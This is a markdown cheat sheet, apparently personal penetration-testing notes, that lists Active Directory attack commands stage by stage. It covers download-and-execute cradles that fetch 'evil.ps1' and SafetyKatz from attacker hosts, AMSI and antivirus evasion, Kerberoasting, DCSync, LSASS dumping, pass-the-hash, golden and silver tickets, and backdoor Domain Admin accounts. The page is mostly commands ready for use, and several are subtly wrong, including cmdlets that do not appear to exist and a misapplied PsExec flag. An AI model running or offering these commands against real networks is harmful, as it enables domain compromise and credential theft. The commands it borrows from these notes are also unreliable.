---
layout: notes
permalink: /notes/ad/attack/
title: Active Directory Attack Vectors
---

# Stage 1: Initial Access
## 1.1 PowerShell Execution & Download-Execute Cradles
```powershell
# Download and execute remote payload via WebClient (Action: Fetch and run malicious script; Purpose: Gain initial foothold)
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

# Use IE COM object to download and execute (Action: Stealthy script fetch; Purpose: Initial code execution)
$ie = New-Object -ComObject InternetExplorer.Application; $ie.visible = $False; $ie.navigate('http://192.168.230.1/evil.ps1'); sleep 5; iex $ie.Document.body.innerHTML; $ie.quit()

# PowerShell v3+ shorthand with Invoke-WebRequest (Action: Quick script download; Purpose: Simplified initial access)
iex (iwr 'http://192.168.230.1/evil.ps1')

# Use XMLHTTP COM object to fetch and execute (Action: Alternative HTTP fetch; Purpose: Evade detection)
$h = New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','http://192.168.230.1/evil.ps1',$false); $h.send(); iex $h.responseText

# Use .NET WebRequest to fetch payload (Action: Robust HTTP fetch; Purpose: Reliable initial access)
$wr = [System.Net.WebRequest]::Create('http://192.168.230.1/evil.ps1'); $r = $wr.GetResponse(); iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

# Stage 2: Execution
## 2.1 Execution Policy & Bypass Techniques
```powershell
# Bypass execution policy via command-line (Action: Run script ignoring policy; Purpose: Enable execution on restricted systems)
powershell -ExecutionPolicy bypass -c "<your-command-here>"

# Execute encoded command (Action: Run obfuscated code; Purpose: Evade logging)
powershell -encodedcommand <base64string>  

# Set environment variable to bypass policy (Action: Temporarily disable restrictions; Purpose: Allow script execution)
$env:PSExecutionPolicyPreference='bypass'; <your-command-here>
```

## 2.2 Loading Scripts and Modules
```powershell
# Dot-source a PowerShell script (Action: Load script into session; Purpose: Prepare enumeration tools)
. C:\AD\Tools\PowerView.ps1

# Import AD module (Action: Load AD cmdlets; Purpose: Enable AD enumeration)
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# List module commands (Action: Display available cmdlets; Purpose: Verify toolset)
Get-Command -Module ActiveDirectory
```

## 2.3 Bypassing PowerShell Security Controls
```powershell
# Check AMSI detection with AMSITrigger (Action: Test script for AV flags; Purpose: Identify detection points)
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1  

# Scan script for Defender detections (Action: Analyze AV triggers; Purpose: Refine payloads)
DefenderCheck.exe PowerUp.ps1  

# Obfuscate script with Invoke-Obfuscation (Action: Obfuscate code; Purpose: Evade AV/EDR)
. C:\AD\Tools\Invoke-Obfuscation.ps1; Invoke-Obfuscation -ScriptPath C:\AD\Tools\Payload.ps1 -Command 'Obfuscate'
```

## 2.4 Offensive .NET Payload Delivery
```powershell
# Deliver binary payload with NetLoader (Action: Fetch and run binary; Purpose: Execute advanced tools)
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe  

# Load NetLoader in memory (Action: In-memory execution; Purpose: Avoid disk detection)
C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe  
```

# Stage 3: Enumeration
## 3.1 Domain Enumeration
```bash
# Enumerate domain users anonymously (Action: List all domain users; Purpose: Gather user list)
rpcclient -U "" -N <target_ip> -c "enumdomusers" 

# Enumerate domain groups (Action: List all domain groups; Purpose: Identify group structure)
rpcclient -U "<domain>\<user>" -W <domain> <target_ip> -c "enumdomgroups" 

# Show group members by RID (Action: List group membership; Purpose: Map privilege groups)
rpcclient -U "<domain>\<user>" -W <domain> <target_ip> -c "enumgroupmem <group_rid>"  

# Query user details by RID (Action: Retrieve user info; Purpose: Detailed user recon)
rpcclient -U "<domain>\<user>" -W <domain> <target_ip> -c "queryuser <user_rid>"  

# List SMB shares (Action: Enumerate shares; Purpose: Identify accessible resources)
smbclient -L //target_ip -U "<domain>\<user>%<password>"  

# DNS query for LDAP SRV records (Action: Locate DCs; Purpose: Map domain infrastructure)
dig -t SRV _ldap._tcp.<domain>  

# Enumerate AD users via LDAP (Action: Query user objects; Purpose: Comprehensive user list)
ldapsearch -H ldap://<target_ip> -x -D "<domain>\<user>" -w <password> -b "DC=<domain>,DC=com" "(objectclass=user)" 

# Enumerate AD computers via LDAP (Action: Query computer objects; Purpose: Identify endpoints)
ldapsearch -H ldap://<target_ip> -x -D "<domain>\<user>" -w <password> -b "DC=<domain>,DC=com" "(objectclass=computer)"  
```

## 3.2 Domain Enumeration
```powershell
# Get current domain info (Action: Retrieve domain details; Purpose: Basic domain recon)
Get-ADDomain

# List all users with properties (Action: Full user enumeration; Purpose: Gather user data)
Get-ADUser -Filter * -Properties *  

# List all computers (Action: Enumerate computers; Purpose: Map endpoints)
Get-ADComputer -Filter * | select Name, OperatingSystem

# Run SharpHound collector (Action: Collect AD data; Purpose: BloodHound graphing)
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All  

# Enumerate domain with PowerView (Action: Basic domain info; Purpose: Quick recon)
Get-Domain

# Enumerate SPN users with PowerView (Action: Identify Kerberoast targets; Purpose: Prep for credential attacks)
Get-DomainUser -SPN

# List domain controllers (Action: Identify DCs; Purpose: Target key systems)
nltest /dclist:<domain>  

# Get DC info via AD module (Action: Detailed DC enumeration; Purpose: Infrastructure mapping)
Get-ADDomainController -Filter *

# Query DNS for DCs (Action: Locate DCs via DNS; Purpose: Network reco
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

# List domain users (Action: Basic user enumeration; Purpose: Quick user list)
net user /domain  

# List domain groups (Action: Basic group enumeration; Purpose: Identify privilege groups)
net group /domain  

# Get Domain Admins members (Action: List privileged users; Purpose: Target identification)
Get-ADGroupMember -Identity 'Domain Admins'

# Enumerate user DNs (Action: List user distinguished names; Purpose: AD object recon)
dsquery user -o dn  
```

## 3.3 ACL & Object Permissions
```powershell
# Retrieve ACLs for an object (Action: Check permissions; Purpose: Identify privilege escalation paths)
Get-DomainObjectAcl -Identity Administrator -ResolveGUIDs

# Find notable ACEs (Action: Highlight exploitable permissions; Purpose: Escalate privileges)
Find-InterestingDomainAcl -ResolveGUIDs

# Retrieve share ACL (Action: Check share permissions; Purpose: Access control recon)
Get-PathAcl -Path '\\us-dc\sysvol' 
```

## 3.4 Trust Relationships & Forest Mapping
```powershell
# Get domain trusts (Action: List trust relationships; Purpose: Map trust attack paths)
Get-DomainTrust

# List specific trust (Action: Detailed trust info; Purpose: Targeted trust recon)
Get-ADTrust -Identity techcorp.local

# Retrieve forest info (Action: Map forest structure; Purpose: Multi-domain attack prep)
Get-ADForest

# List forest domains (Action: Enumerate all domains; Purpose: Forest-wide recon)
(Get-ADForest).Domains

# Map global catalogs (Action: Locate GC servers; Purpose: Infrastructure mapping)
Get-ADForest | select -ExpandProperty GlobalCatalogs

# List trusted domains (Action: Basic trust enumeration; Purpose: Quick trust recon)
nltest /domain_trusts

# Check trust details (Action: Verify trust attributes; Purpose: Trust exploitation prep)
netdom query trust  
```

## 3.5 gMSA Enumeration
```powershell
# Enumerate gMSAs (Action: List group Managed Service Accounts; Purpose: Identify abusable accounts)
Get-ADServiceAccount -Filter *

# Enumerate gMSAs with PowerView (Action: Alternative gMSA list; Purpose: Recon for abuse)
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' 

# Check gMSA password readers (Action: Identify access rights; Purpose: Prep for password retrieval)
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

# Stage 4: Credential Access
## 4.1 Kerberoasting Attacks
```powershell
# List SPN accounts (Action: Identify Kerberoast targets; Purpose: Gather roastable users)
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName

# Gather Kerberoast stats (Action: Analyze SPN usage; Purpose: Plan attack)
Rubeus.exe kerberoast /stats

# Request ticket for a user (Action: Obtain TGS; Purpose: Kerberoast single target)
Rubeus.exe kerberoast /user:serviceaccount /simple 

# Request all Kerberoastable tickets (Action: Collect hashes stealthily; Purpose: Mass Kerberoasting)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Crack Kerberos hashes (Action: Recover passwords; Purpose: Gain credentials)
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

# Kerberoast with Impacket (Action: Extract TGS hashes; Purpose: Linux-based Kerberoasting)
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -o hash.txt  
```

## 4.2 Targeted Kerberoasting
```powershell
# Check user SPN (Action: Verify SPN presence; Purpose: Prep for targeting)
Get-DomainUser -Identity support1user | select serviceprincipalname

# Check SPN with AD module (Action: Alternative SPN check; Purpose: Confirm target)
Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName

# Set SPN with PowerView (Action: Add SPN; Purpose: Enable Kerberoasting)
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}

# Set SPN with AD module (Action: Add SPN; Purpose: Alternative targeting)
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}

# Kerberoast all targets (Action: Collect TGS hashes; Purpose: Execute attack)
Rubeus.exe kerberoast /outfile:targetedhashes.txt

# Crack targeted hashes (Action: Recover password; Purpose: Gain access)
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt  
```

## 4.3 ASREPRoast
```bash
# Perform ASREPRoast (Action: Request AS-REP hash; Purpose: Extract crackable hash)
GetNPUsers.py <domain>/<user> -dc-ip <dc_ip> -no-pass -request  
```

## 4.4 OverPass-The-Hash (OPTH)
```powershell
# Generate token with AES256 (Action: Pass hash; Purpose: Spawn process)
Invoke-Mimikatz -Command '\"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe\"'

# OPTH with SafetyKatz (Action: Pass hash; Purpose: Alternative execution)
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256key> /run:cmd.exe" "exit"  

# OPTH with NTLM (Action: Request and pass TGT; Purpose: Non-elevated access)
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt  

# OPTH with AES256 (Action: Stealthy TGT pass; Purpose: Elevated access)
Rubeus.exe asktgt /user:administrator /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
```

## 4.5 DCSync
```powershell
# Extract krbtgt hash (Action: Perform DCSync; Purpose: Gain domain creds)
Invoke-Mimikatz -Command '\"lsadump::dcsync /user:us\krbtgt\"'

# DCSync with SafetyKatz (Action: Alternative DCSync; Purpose: Extract krbtgt)
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"  
```

## 4.6 gMSA Abuse
```powershell
# Decode gMSA password (Action: Extract NTLM hash; Purpose: Impersonate gMSA)
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'; Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1; $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob; ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

# Use gMSA NTLM hash (Action: Pass hash; Purpose: Gain access)
mimikatz.exe "sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078" 
```

## 4.7 Lateral Movement & Credential Extraction
```powershell
# Dump encryption keys (Action: Extract credentials; Purpose: Gather keys)
Invoke-Mimikatz -Command '\"sekurlsa::ekeys\"'

# Dump keys with SafetyKatz (Action: Alternative key dump; Purpose: Credential extraction)
SafetyKatz.exe "sekurlsa::ekeys"  

# Dump keys with SharpKatz (Action: .NET-based dump; Purpose: Extract creds)
SharpKatz.exe --Command ekeys  

# Dump LSASS memory (Action: Extract raw memory; Purpose: Offline cred 
rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump <LSASS_PID> C:\Users\Public\lsass.dmp

# Dump creds with pypykatz (Action: Live LSA dump; Purpose: Linux-based extraction)
pypykatz.exe live lsa  

# Dump LSASS with Shtinkering (Action: Alternative dump; Purpose: Credential harvesting)
Lsass_Shtinkering.exe  

# Dump plaintext passwords (Action: Extract logon creds; Purpose: Gain access)
mimikatz.exe "sekurlsa::logonpasswords"  
```

## 4.8 Password Attacks
```bash
# Password spraying (Action: Test creds across hosts; Purpose: Find valid logins)
crackmapexec smb <target> -u users.txt -p passwords.txt  

# Brute-force LDAP (Action: Guess passwords; Purpose: Credential discovery)
hydra -l <user> -P wordlist.txt <target> ldap  

# Crack hashes with John (Action: Recover passwords; Purpose: Post-extraction access)
john --wordlist=wordlist.txt hash.txt  
```

## 4.9 MITM Attacks
```bash
# Start Responder (Action: Capture NTLM hashes; Purpose: Man-in-the-middle attack)
responder -I eth0  

# Capture hashes with proxy (Action: Enhanced NTLM capture; Purpose: Credential theft)
responder -I eth0 -P  

# Force NBT-NS auth (Action: Trigger authentication; Purpose: Facilitate MITM)
nbtscan <target>  
```

# Stage 5: Privilege Escalation
## 6.1 Domain Privilege Escalation - Unconstrained Delegation
```powershell
# Extract TGTs from LSASS (Action: Dump tickets; Purpose: Abuse delegation)
impacket-mimikatz '<domain>\<user>:<password>@<target_computer>' -k  

# Identify unconstrained delegation (Action: List vulnerable computers; Purpose: Target selection)
Get-DomainComputer -UnConstrained

# Find delegation computers (Action: Alternative enumeration; Purpose: Prep for abuse)
Get-ADComputer -Filter {TrustedForDelegation -eq $True} 

 # Export TGTs (Action: Save tickets; Purpose: Prepare for injection)
Invoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'

# Inject TGT (Action: Use ticket; Purpose: Gain access)
Invoke-Mimikatz -Command '\"kerberos::ptt ticket.kirbi\"'

# Printer Bug to force DC connection (Action: Trigger auth; Purpose: Capture TGT)
.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local  

# Monitor for TGTs (Action: Watch for tickets; Purpose: Harvest creds)
.\Rubeus.exe monitor /interval:5  
```

## 5.2 Delegation Exploits
```powershell
# Check for delegation (Action: Identify accounts; Purpose: Target selection)
Get-ADUser -Filter {TrustedForDelegation -eq $true}

# Exploit constrained delegation (Action: Abuse delegation; Purpose: Escalate access)
mimikatz.exe "kerberos::delegate"  

# Enable delegation (Action: Set up exploit; Purpose: Prep for abuse)
Set-ADUser -Identity <user> -Add @{msDS-AllowedToDelegateTo='dc01'}
```

# Stage 6: Lateral Movement
## 6.1 PowerShell Remoting
```powershell
# Create interactive session (Action: Remote shell; Purpose: Move laterally)
$Sess = New-PSSession -ComputerName Server1; Enter-PSSession -Session $Sess

# Execute command on multiple hosts (Action: Mass execution; Purpose: Spread access)
Invoke-Command -ScriptBlock { Get-Process } -ComputerName (Get-Content 'servers.txt')

# Run script remotely (Action: Execute payload; Purpose: Extract creds)
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content 'servers.txt')

# Run local function remotely (Action: Deploy function; Purpose: Targeted attack)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content 'servers.txt') -ArgumentList <arguments>

# Use stateful session (Action: Persistent remote access; Purpose: Maintain control)
$Sess = New-PSSession -ComputerName Server1; Invoke-Command -Session $Sess -ScriptBlock { $Proc = Get-Process }; Invoke-Command -Session $Sess -ScriptBlock { $Proc.Name }

# Lightweight remoting (Action: Quick command; Purpose: Simple lateral move)
winrs -remote:server1 -u "server1\administrator" -p "Pass@1234" hostname  
```

## 6.2 PsExec
```powershell
# Execute command remotely (Action: Run shell; Purpose: Move to target)
PsExec.exe \\\\<target> -u <user> -p <pass> cmd  

# Run with hash (Action: Pass-the-hash; Purpose: Cred-based access)
PsExec.exe \\\\<target> -hashes <lm:ntlm> cmd  

# Upload and execute (Action: Deploy payload; Purpose: Establish foothold)
PsExec.exe \\\\<target> -c evil.exe -u <user> -p <pass>  
```

## 6.3 WMI
```powershell
# Execute remote command (Action: Run shell; Purpose: Lateral move
wmic /node:<target> process call create "cmd.exe /c whoami"  

# Query remote processes (Action: Recon processes; Purpose: Target verification)
wmic /node:<target> process get caption,executablepath  

# Start process with creds (Action: Authenticated execution; Purpose: Move with creds)
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe"  
```

## 6.4 RDP
```powershell
# Connect via RDP (Action: Interactive access; Purpose: Manual lateral move)
mstsc /v:<target>  

# Enable RDP remotely (Action: Activate RDP; Purpose: Prep for access)
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  

# Add user to RDP group (Action: Grant RDP access; Purpose: Facilitate movement)
net localgroup "Remote Desktop Users" <user> /add  
```

# Stage 7: Persistence
## 7.1 Domain Persistence - Golden Ticket
```bash
# Create Golden Ticket (Action: Forge TGT; Purpose: Long-term access)
impacket-ticketer -aesKey <krbtgt_aes_key> -domain-sid <domain_sid> -domain <domain> -spn cifs/<dc_hostname> <impersonated_user>

# Use ticket for DC access (Action: Execute commands; Purpose: Maintain control)
impacket-psexec -k -no-pass <domain>/<impersonated_user>@<dc_ip> "cmd.exe"  

# Set ticket for use (Action: Configure ticket; Purpose: Enable further attacks)
export KRB5CCNAME=<path_to_ticket.ccache>  
```

## 7.2 Golden Ticket
```powershell
# Generate Golden Ticket (Action: Forge TGT; Purpose: Persistent domain access)
mimikatz.exe "kerberos::golden /admin:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash>" 

# Inject Golden Ticket (Action: Apply ticket; Purpose: Gain access)
mimikatz.exe "kerberos::ptt <ticket.kirbi>" 

# Verify ticket (Action: Check ticket status; Purpose: Confirm persistence)
klist  
```

## 7.3 Silver Ticket
```powershell
# Generate Silver Ticket (Action: Forge TGS; Purpose: Service-specific access)
mimikatz.exe "kerberos::silver /service:HTTP /target:<target> /sid:<sid> /rc4:<hash>"  

# Test Silver Ticket (Action: Verify service access; Purpose: Confirm exploit)
curl -k https://<target>  
```

## 7.4 Shadow Credentials
```powershell
# Add shadow credentials (Action: Modify key credentials; Purpose: Backdoor account)
Whisker.exe -u <user> -d <domain> -p <password>  

# Rotate credentials (Action: Update creds; Purpose: Maintain access)
Rotate-ADObject -Identity <user>

# Verify shadow creds (Action: Check attribute; Purpose: Confirm persistence)
Get-ADUser -Identity <user> -Properties msDS-KeyCredentialLink
```

## 7.5 AD Backdoors
```powershell
# Add backdoor user (Action: Create account; Purpose: Persistent access)
net user backdoor P@ssw0rd /add /domain  

# Add to Domain Admins (Action: Escalate backdoor; Purpose: High-priv persistence)
net group "Domain Admins" backdoor /add /domain 

# Modify GPO for persistence (Action: Set password; Purpose: Long-term control)
Set-GPPassword -Password 'NewPass' -Context <OU>
```

# 8. Tools
- Mimikatz: ```mimikatz.exe "sekurlsa::logonpasswords"```
- CrackMapExec: ```crackmapexec smb <target> -u <user> -p <pass>```
- Responder: ```responder -I eth0```
- Kerbrute: ```kerbrute userenum -d <domain> userlist.txt```
- Impacket: ```python3 GetUserSPNs.py <domain>/<user> -dc-ip <dc_ip>```
- BloodHound: ```bloodhound-python -u <user> -p <pass> -d <domain> -c All```
- PowerView: ```Import-Module .\PowerView.ps1; Get-NetDomain```
- ADRecon: ```.\ADRecon.ps1```
- SharpHound: ```SharpHound.exe -c All```
- PingCastle: ```PingCastle.exe --healthcheck```
- PsExec: ```PsExec.exe \\\\<target> -u <user> -p <pass>```
- WMIExec: ```wmiexec.py <target> -u <user> -p <pass>```
- RDPWrap: ```rdpwrap.dll```
- Whisker: ```Whisker.exe -u <user> -d <domain>```
- ADModule: ```Set-ADUser -Identity <user> -Enabled $true```